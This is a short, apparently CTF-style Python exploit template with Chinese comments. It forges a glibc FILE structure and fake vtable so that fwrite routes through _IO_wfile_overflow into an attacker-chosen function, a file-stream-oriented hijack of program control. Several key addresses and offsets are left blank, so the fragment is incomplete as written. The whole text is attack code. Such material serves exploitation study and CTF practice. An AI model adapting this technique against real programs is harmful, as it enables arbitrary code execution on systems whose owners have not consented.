# prepare fake vtable
# *(fake_vtable+0x68) = 指向需要调用函数的一个地址 而不是本身
vtable_addr = 

# exploiting with IO_wfile_overflow
fake_io_file = FileStructure()
## make _wide_data+0xe0 = fake_vtable
## make (_wide_data+0x18) = 0
wide_data_addr =  
fake_io_file._wide_data = wide_data_addr

fake_io_file._lock = libc_base +  
_IO_wfile_over_flow = libc_base + 
fake_io_file.vtable = _IO_wfile_over_flow - 0x38 # fwrite call vtable+0x38
fake_io_file.mode = 1
